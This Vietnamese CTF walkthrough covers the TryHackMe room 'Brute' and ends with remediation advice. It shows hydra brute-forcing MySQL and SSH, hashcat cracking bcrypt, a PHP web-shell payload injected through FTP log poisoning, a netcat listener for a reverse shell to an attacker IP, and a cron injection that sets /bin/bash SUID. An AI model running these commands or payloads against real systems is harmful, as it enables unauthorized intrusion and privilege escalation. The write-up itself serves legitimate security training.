@@ -1,0 +1,221 @@
+---
+title: 'Brute'
+description: 'MySQL mở ra mạng với mật khẩu root yếu bị crack ngay, FTP log poisoning biến log xác thực hiển thị lại thành RCE, brute SSH theo rule tìm được user, và một cron job root echo tệp mà attacker ghi được bị chèn lệnh để SUID bash.'
+date: 2026-01-08
+platform: tryhackme
+room: 'Brute'
+roomUrl: 'https://tryhackme.com/room/ettubrute'
+difficulty: medium
+tags:
+  - 'ftp'
+  - 'mysql'
+  - 'web'
+  - 'log-poisoning'
+  - 'rce'
+  - 'password-cracking'
+  - 'bcrypt'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+## **Brute — MySQL Phơi Ra Ngoài, FTP Log Poisoning, và Cron Root Echo Tệp Của Bạn**
+
+_Một bài walkthrough cho box "Brute" của TryHackMe. Cái tên là gợi ý, nhưng bài học thật sự nhiều tầng: một dịch vụ MySQL phơi ra mạng với mật khẩu root đoán được, một trang đăng nhập web hiển thị thẳng log xác thực FTP cho ta (nên ta "đầu độc" log đó thành PHP RCE), một lần brute SSH theo rule để sang user thật, và một script cron do root chạy_ _`echo`_ _lên một tệp mà attacker ghi được — command injection kinh điển — để thả một shell SUID._
+
+> Flag, mật khẩu đã crack, và IP mục tiêu đều được ẩn. Brute là box huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên một mục tiêu luyện tập được cho phép. Flag hiển thị dạng `THM{<redacted>}` và các bí mật thu được dạng `<redacted>` — có thật trên box nhưng ẩn ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+**MySQL (3306) phơi ra mạng** và `root` dùng mật khẩu nằm trong từ điển → crack bằng hydra, dump `website.users`, và crack hash **bcrypt** của Adrian offline → nhưng trang đăng nhập web hiển thị lại **log đăng nhập FTP** ngay trên màn hình, nên thay vì đăng nhập ta **đầu độc log FTP** bằng cách kết nối với tên người dùng `<?php system($_GET['c']);?>` → trang hiển thị log thực thi nó → **RCE với quyền** **`www-data`** → một tệp `.reminder` ghi rõ bộ rule **best64 +** **`!`** áp lên từ `ettubrute`, nên ta dựng wordlist đó và **brute SSH** để vào với tư cách `adrian` (`user.txt`) → một cron root chạy script làm `sh -c "echo $line"` lên `/home/adrian/punch_in`, một tệp **ta ghi được** → chèn `chmod +s /bin/bash`, chờ một phút, rồi `bash -p` cho **root**.
+
+DB phơi ra → RCE qua log hiển thị lại → brute SSH theo rule → command injection trong cron root → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Một lượt quét `rustscan`/`nmap` cho thấy bốn dịch vụ: FTP, SSH, một trang đăng nhập Apache, và — đáng chú ý — **MySQL mở ra toàn mạng**:
+
+```text
+21/tcp   open  ftp     vsftpd 3.0.5
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu)  — "Login" page
+3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
+```
+
+Quét nội dung cổng 80 nhanh tìm ra các thành phần đăng nhập thường gặp (`index.php`, `welcome.php` → chuyển hướng về `login.php`, `config.php`). Chưa có gì nổi bật về web — nhưng một database lắng nghe ở `3306` từ vị trí chưa xác thực là phát hiện ồn ào nhất trên bảng.
+
+### **Lỗ hổng — một database mà bạn chỉ việc đăng nhập**
+
+MySQL không bao giờ nên truy cập được từ mạng không tin cậy với một mật khẩu nằm trong wordlist. Ở đây cả hai điều đều đúng.
+
+<Callout type="insight">
+
+Điểm thú vị là lỗi _thứ hai_: ứng dụng web hiển thị thẳng **log xác thực FTP** lên một trang. Bất kỳ dịch vụ nào echo lại một log mà bạn ghi được đều là ứng viên **log poisoning** — trường `USER` của FTP do attacker kiểm soát, nên ta nhét PHP vào đó, và trang render log sẽ thực thi nó. Database chỉ cho ta hash bcrypt của user; chính cái log hiển thị lại mới mang lại thực thi mã.
+
+</Callout>
+
+### **Bước 1 — crack login root MySQL đang phơi ra**
+
+```text
+hydra -l root -P rockyou.txt $IP mysql
+# [3306][mysql] host: $IP   login: root   password: <redacted>
+```
+
+Đăng nhập và dump database của ứng dụng:
+
+```text
+mysql -h $IP -u root -p --ssl=0
+MySQL [(none)]> show databases;   -- information_schema, mysql, ..., website
+MySQL [website]> select * from users;
+# id | username | password                                                     | created_at
+#  1 | Adrian   | $2y$10$................................bcrypt..............  | 2021-10-20
+```
+
+Một user duy nhất, `Adrian`, với hash **bcrypt** (`$2y$`).
+
+### **Bước 2 — crack hash bcrypt offline**
+
+```text
+hashcat -m 3200 -a 0 hash.txt rockyou.txt
+# $2y$10$...:<redacted>
+```
+
+Mật khẩu crack ra trong vài giây với rockyou. Nó xác nhận cách app lưu creds, nhưng đăng nhập vào form web chỉ hiện một trang **các lần đăng nhập FTP thất bại** — và đó mới là cửa vào thật.
+
+### **Bước 3 — đầu độc log FTP thành RCE**
+
+Trang log render lại các lần thử đăng nhập FTP nguyên văn. FTP ghi lại _tên người dùng_ bạn thử, và vsftpd không hề làm sạch nó, nên ta xác thực với một payload PHP làm tên người dùng:
+
+```text
+ftp -A $IP
+Name: <?php system($_GET['c']);?>
+# 530 Login incorrect.   (but the attempt is now logged)
+```
+
+Mục log hiện ra dạng `FAIL LOGIN: Client "..."`, và khi app web render log đó, PHP của ta chạy. Truyền lệnh qua tham số `c` (Burp làm việc này dễ dàng), xác nhận bằng `ls`, rồi bắn một reverse shell — Python3 có sẵn:
+
+```text
+# attacker
+nc -lvnp 4444
+# via the poisoned log page: python3 reverse shell back to $ATTACKER_IP:4444
+```
+
+Ổn định shell với tư cách `www-data`:
+
+```text
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# www-data@...:/var/www/html$
+```
+
+### **Bước 4 — đọc gợi ý, brute SSH với một bộ rule**
+
+Trong home của Adrian, tệp `.reminder` mô tả đúng cách dựng mật khẩu:
+
+```text
+Rules:
+best of 64
++ exclamation
+
+ettubrute
+```
+
+"best of 64" là bộ rule `best64` đi kèm John và hashcat; "+ exclamation" nghĩa là thêm một dấu `!`. Ta tạo các ứng viên từ một từ duy nhất `ettubrute`:
+
+```text
+echo ettubrute | john --stdout --pipe '--rules=best64' > passwords.txt
+sed -i 's/$/!/' passwords.txt     # append ! to every line
+```
+
+Rồi brute SSH cho `adrian`:
+
+```text
+hydra -l adrian -P passwords.txt ssh://$IP
+# [22][ssh] host: $IP   login: adrian   password: <redacted>
+```
+
+SSH vào và lấy flag user:
+
+```text
+ssh adrian@$IP
+adrian@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 5 — command injection trong một cron job của root**
+
+Home của Adrian chứa một trò "chấm công". Một script do root sở hữu lặp qua một tệp và echo từng dòng qua một shell:
+
+```text
+#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c "echo $line";
+done < /home/adrian/punch_in
+```
+
+Tệp nó đọc, `/home/adrian/punch_in`, **adrian ghi được**, và một mục cron chạy logic chấm công mỗi phút với quyền root. Vì dòng được nhét vào `sh -c "echo $line"` mà không trích dẫn, bất cứ thứ gì ta thêm vào đều được root thực thi. Ta thêm một lệnh làm cho `bash` trở nên SUID:
+
+```text
+nano /home/adrian/punch_in
+# ...append this line:
+`chmod +s /bin/bash`
+```
+
+Chờ hết một phút, và `bash` giờ là SUID root:
+
+```text
+ls -al /usr/bin/bash
+# -rwsr-sr-x 1 root root ... /usr/bin/bash
+/usr/bin/bash -p
+bash-5.0# id && cat /root/root.txt
+# uid=0 ... root
+THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Ba thất bại chồng lên nhau biến một vị trí ẩn danh trên mạng thành root:
+
+- **MySQL phơi ra mạng với mật khẩu** **`root`** **trong từ điển** — database bị chiếm và lộ thông tin đăng nhập ngay lập tức.
+- **Log FTP hiển thị lại → thực thi PHP** — một RCE log-poisoning kinh điển vì một trường do attacker kiểm soát (tên người dùng FTP) được render bởi một trang PHP.
+- **Cron root chạy** **`sh -c "echo $line"`** **lên một tệp user ghi được** — thực thi lệnh không làm sạch với quyền root, dễ dàng leo lên thành shell SUID.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đừng phơi MySQL ra mạng.** Bind nó vào loopback, yêu cầu thông tin đăng nhập mạnh và duy nhất, và đừng bao giờ để `root` xác thực từ xa với mật khẩu từ điển.
+2. **Đừng bao giờ render log thô trong một phản hồi web**, và coi trường tên người dùng FTP là đầu vào không tin cậy. Log nên được hiển thị dạng escape, không phải thực thi.
+3. **Trích dẫn biến shell và tránh dựng lệnh từ nội dung tệp.** `sh -c "echo $line"` lên một tệp user ghi được là bị inject; đọc dữ liệu bằng API an toàn và chạy job đặc quyền chỉ trên các tệp mà chỉ root ghi được.
+4. **Lưu mật khẩu theo cách kháng crack offline** (bcrypt với cost cao là đúng, nhưng vô ích nếu plaintext là một từ trong từ điển).
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một database phơi ra là một cửa trước.** Một DB ở `3306` truy cập được từ VPN, với `root` crack được, là xong trước cả khi ứng dụng web có ý nghĩa.
+- **Bất cứ thứ gì echo lại log mà bạn ghi được đều là RCE.** Tên người dùng FTP do attacker kiểm soát; một trang render log đó sẽ thực thi PHP của bạn.
+- **Đọc gợi ý của box theo nghĩa đen.** `best64 + !` lên `ettubrute` là một công thức chính xác — biến nó thành wordlist thay vì đoán.
+- **Biến không trích dẫn trong script root là command injection.** `echo $line` từ một tệp bạn ghi được chính là toàn bộ bước privesc.
+
+Cảm ơn bạn đã đọc. "Brute" xứng với cái tên, nhưng mỗi nấc thang ở đây thật ra là một thất bại về niềm tin — một database bạn không nên chạm tới, một log bạn không nên thấy bị thực thi, và một job root tin một tệp mà nó không nên tin.
